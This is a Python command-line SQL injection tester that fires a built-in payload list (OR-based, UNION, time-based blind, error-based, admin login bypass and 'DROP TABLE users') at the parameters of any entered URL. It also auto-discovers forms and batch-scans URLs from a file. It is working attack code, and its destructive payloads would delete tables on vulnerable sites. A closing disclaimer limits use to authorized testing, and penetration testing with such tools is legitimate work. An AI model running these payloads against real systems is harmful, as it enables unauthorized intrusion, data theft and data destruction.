import requests
import urllib.parse
import time
import re
from urllib.parse import urljoin, urlparse

class SQLInjectionTester:
    def __init__(self):
        self.payloads = [
            # Basic SQL injection payloads
            "'",
            "\"",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 1=1#",
            "\" OR 1=1#",
            "1' OR '1'='1'--",
            "1\" OR \"1\"=\"1\"--",
            "1' OR '1'='1'#",
            "1\" OR \"1\"=\"1\"#",
            
            # Union-based payloads
            "' UNION SELECT 1--",
            "\" UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "\" UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "\" UNION SELECT 1,2,3--",
            
            # Boolean-based blind payloads
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1\" AND 1=1--",
            "1\" AND 1=2--",
            
            # Time-based blind payloads
            "1'; WAITFOR DELAY '00:00:05'--",
            "1\"; WAITFOR DELAY '00:00:05'--",
            "1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES) > 0 AND SLEEP(5)--",
            
            # Error-based payloads
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e))--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
            
            # Advanced payloads
            "1'; DROP TABLE users--",
            "1\"; DROP TABLE users--",
            "admin'--",
            "admin\"--",
            "' OR 'a'='a",
            "\" OR \"a\"=\"a",
        ]
        
        self.error_patterns = [
            # MySQL errors
            r"mysql_fetch_array\(\)",
            r"mysql_query\(\)",
            r"mysql_num_rows\(\)",
            r"MySQL server version",
            r"supplied argument is not a valid MySQL",
            r"Column count doesn't match value count",
            
            # PostgreSQL errors
            r"PostgreSQL query failed",
            r"pg_query\(\)",
            r"pg_exec\(\)",
            
            # Microsoft SQL Server errors
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Incorrect syntax near",
            r"Unclosed quotation mark after the character string",
            
            # Oracle errors
            r"ORA-[0-9]{5}",
            r"Oracle ODBC",
            
            # Generic SQL errors
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"SQL query",
            r"syntax error",
            r"unexpected end of SQL command",
        ]
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })

    def test_url(self, url, method='GET', data=None, headers=None, timeout=10):
        """Test a single URL with SQL injection payloads"""
        results = []
        
        print(f"🎯 Testing URL: {url}")
        print(f"📋 Method: {method}")
        
        if headers:
            self.session.headers.update(headers)
        
        # Get parameters from URL
        parsed_url = urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        # Test GET parameters
        if method.upper() == 'GET' and params:
            for param in params:
                print(f"🔍 Testing GET parameter: {param}")
                results.extend(self._test_parameter(url, param, params[param][0], 'GET', timeout))
        
        # Test POST data
        elif method.upper() == 'POST' and data:
            for param in data:
                print(f"🔍 Testing POST parameter: {param}")
                results.extend(self._test_parameter(url, param, data[param], 'POST', timeout, data))
        
        return results

    def _test_parameter(self, url, param_name, original_value, method, timeout, post_data=None):
        """Test a specific parameter with SQL injection payloads"""
        results = []
        
        for i, payload in enumerate(self.payloads, 1):
            print(f"⏳ Testing payload {i}/{len(self.payloads)}: {payload[:50]}...")
            
            try:
                # Prepare request
                if method.upper() == 'GET':
                    # Modify URL parameter
                    parsed_url = urlparse(url)
                    params = urllib.parse.parse_qs(parsed_url.query)
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                    
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=timeout)
                    response_time = time.time() - start_time
                    
                else:  # POST
                    test_data = post_data.copy()
                    test_data[param_name] = payload
                    
                    start_time = time.time()
                    response = self.session.post(url, data=test_data, timeout=timeout)
                    response_time = time.time() - start_time
                
                # Analyze response
                vulnerability = self._analyze_response(response, payload, response_time)
                
                if vulnerability:
                    results.append({
                        'parameter': param_name,
                        'payload': payload,
                        'method': method,
                        'vulnerability_type': vulnerability['type'],
                        'evidence': vulnerability['evidence'],
                        'response_time': response_time,
                        'status_code': response.status_code
                    })
                    print(f"🚨 VULNERABILITY FOUND!")
                    print(f"   Type: {vulnerability['type']}")
                    print(f"   Evidence: {vulnerability['evidence'][:100]}...")
                
                # Small delay to avoid overwhelming the server
                time.sleep(0.1)
                
            except requests.exceptions.Timeout:
                # Potential time-based SQL injection
                if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                    results.append({
                        'parameter': param_name,
                        'payload': payload,
                        'method': method,
                        'vulnerability_type': 'Time-based Blind SQL Injection',
                        'evidence': 'Request timed out (potential time-based injection)',
                        'response_time': timeout,
                        'status_code': 'TIMEOUT'
                    })
                    print(f"🚨 POTENTIAL TIME-BASED INJECTION FOUND!")
                
            except Exception as e:
                print(f"❌ Error testing payload: {str(e)}")
                continue
        
        return results

    def _analyze_response(self, response, payload, response_time):
        """Analyze response for SQL injection indicators"""
        content = response.text.lower()
        
        # Check for SQL error messages
        for pattern in self.error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return {
                    'type': 'Error-based SQL Injection',
                    'evidence': f"SQL error pattern detected: {pattern}"
                }
        
        # Check for time-based indicators
        if response_time > 4 and ('SLEEP' in payload.upper() or 'WAITFOR' in payload.upper()):
            return {
                'type': 'Time-based Blind SQL Injection',
                'evidence': f"Response delayed by {response_time:.2f} seconds"
            }
        
        # Check for boolean-based indicators
        if "AND 1=1" in payload and "AND 1=2" not in payload:
            # This would need comparison with 1=2 payload for proper detection
            pass
        
        # Check for union-based indicators
        if 'UNION' in payload.upper():
            # Look for additional columns or data in response
            if len(content) > 1000:  # Simple heuristic
                return {
                    'type': 'Union-based SQL Injection',
                    'evidence': "Response contains additional data (potential union injection)"
                }
        
        # Check for authentication bypass
        if payload in ["admin'--", "admin\"--", "' OR '1'='1", "\" OR \"1\"=\"1"]:
            if 'welcome' in content or 'dashboard' in content or 'admin panel' in content:
                return {
                    'type': 'Authentication Bypass',
                    'evidence': "Potential authentication bypass detected"
                }
        
        return None

    def scan_form(self, url, timeout=10):
        """Automatically scan forms on a webpage"""
        print(f"🔍 Scanning forms on: {url}")
        
        try:
            response = self.session.get(url, timeout=timeout)
            content = response.text
            
            # Simple form detection (could be improved with BeautifulSoup)
            forms = re.findall(r'<form[^>]*>(.*?)</form>', content, re.DOTALL | re.IGNORECASE)
            
            if not forms:
                print("❌ No forms found on the page")
                return []
            
            print(f"✅ Found {len(forms)} form(s)")
            
            results = []
            for i, form in enumerate(forms, 1):
                print(f"📝 Analyzing form {i}...")
                
                # Extract action and method
                action_match = re.search(r'action=["\']([^"\']*)["\']', form, re.IGNORECASE)
                method_match = re.search(r'method=["\']([^"\']*)["\']', form, re.IGNORECASE)
                
                action = action_match.group(1) if action_match else url
                method = method_match.group(1) if method_match else 'GET'
                
                # Make action URL absolute
                if action.startswith('/'):
                    parsed_url = urlparse(url)
                    action = f"{parsed_url.scheme}://{parsed_url.netloc}{action}"
                elif not action.startswith('http'):
                    action = urljoin(url, action)
                
                # Extract input fields
                inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>', form, re.IGNORECASE)
                
                if inputs:
                    print(f"   Found inputs: {', '.join(inputs)}")
                    
                    # Create test data
                    test_data = {}
                    for input_name in inputs:
                        test_data[input_name] = 'test'
                    
                    # Test the form
                    form_results = self.test_url(action, method, test_data, timeout=timeout)
                    results.extend(form_results)
                else:
                    print("   No input fields found")
            
            return results
            
        except Exception as e:
            print(f"❌ Error scanning forms: {str(e)}")
            return []

def run():
    """Main function for SQL Injection Tester"""
    
    print("""
==== SQL Injection Tester ====
1. Test Specific URL
2. Scan Forms on Webpage  
3. Batch Test URLs from File
0. Return to Menu
""")
    
    choice = input("Enter your choice: ")
    
    if choice == '0':
        return
    
    tester = SQLInjectionTester()
    
    if choice == '1':
        url = input("Enter target URL: ").strip()
        if not url:
            print("❌ URL cannot be empty!")
            return
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        method = input("Enter method (GET/POST) [GET]: ").strip().upper()
        if not method:
            method = 'GET'
        
        post_data = {}
        if method == 'POST':
            print("Enter POST parameters (key=value, one per line, empty line to finish):")
            while True:
                param_line = input().strip()
                if not param_line:
                    break
                if '=' in param_line:
                    key, value = param_line.split('=', 1)
                    post_data[key.strip()] = value.strip()
        
        print(f"\n🚀 Starting SQL injection test...")
        results = tester.test_url(url, method, post_data if post_data else None)
        
        # Display results
        print(f"\n{'='*60}")
        print(f"🎯 SCAN RESULTS")
        print(f"{'='*60}")
        
        if results:
            print(f"🚨 {len(results)} potential vulnerabilities found:")
            print()
            
            for i, result in enumerate(results, 1):
                print(f"🔥 Vulnerability #{i}")
                print(f"   Parameter: {result['parameter']}")
                print(f"   Method: {result['method']}")
                print(f"   Type: {result['vulnerability_type']}")
                print(f"   Payload: {result['payload']}")
                print(f"   Evidence: {result['evidence']}")
                print(f"   Response Time: {result['response_time']:.2f}s")
                print(f"   Status Code: {result['status_code']}")
                print("-" * 50)
        else:
            print("✅ No SQL injection vulnerabilities detected")
            print("ℹ️  This doesn't guarantee the application is secure")
    
    elif choice == '2':
        url = input("Enter webpage URL to scan forms: ").strip()
        if not url:
            print("❌ URL cannot be empty!")
            return
            
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        print(f"\n🚀 Starting form scan...")
        results = tester.scan_form(url)
        
        # Display results
        print(f"\n{'='*60}")
        print(f"🎯 FORM SCAN RESULTS")
        print(f"{'='*60}")
        
        if results:
            print(f"🚨 {len(results)} potential vulnerabilities found in forms:")
            print()
            
            for i, result in enumerate(results, 1):
                print(f"🔥 Vulnerability #{i}")
                print(f"   Parameter: {result['parameter']}")
                print(f"   Method: {result['method']}")
                print(f"   Type: {result['vulnerability_type']}")
                print(f"   Payload: {result['payload']}")
                print(f"   Evidence: {result['evidence']}")
                print("-" * 50)
        else:
            print("✅ No SQL injection vulnerabilities detected in forms")
    
    elif choice == '3':
        filename = input("Enter filename containing URLs (one per line): ").strip()
        
        try:
            with open(filename, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
            
            print(f"📁 Loaded {len(urls)} URLs from file")
            
            all_results = []
            for i, url in enumerate(urls, 1):
                print(f"\n🎯 Testing URL {i}/{len(urls)}: {url}")
                
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                
                results = tester.test_url(url)
                all_results.extend(results)
                
                # Add URL info to results
                for result in results:
                    result['target_url'] = url
            
            # Display summary
            print(f"\n{'='*60}")
            print(f"🎯 BATCH SCAN RESULTS")
            print(f"{'='*60}")
            print(f"📊 Scanned {len(urls)} URLs")
            print(f"🚨 Found {len(all_results)} potential vulnerabilities")
            
            if all_results:
                print("\n🔥 Vulnerabilities Summary:")
                for i, result in enumerate(all_results, 1):
                    print(f"{i}. {result['target_url']} - {result['vulnerability_type']}")
            
        except FileNotFoundError:
            print(f"❌ File '{filename}' not found!")
        except Exception as e:
            print(f"❌ Error reading file: {str(e)}")
    
    else:
        print("❌ Invalid choice!")
    
    print(f"\n{'='*60}")
    print("⚠️  DISCLAIMER:")
    print("• Only test on systems you own or have explicit permission to test")
    print("• This tool is for educational and authorized testing purposes only")
    print("• Unauthorized testing may be illegal")
    print(f"{'='*60}")
    
    input("\nPress Enter to continue...")

if __name__ == "__main__":
    run()
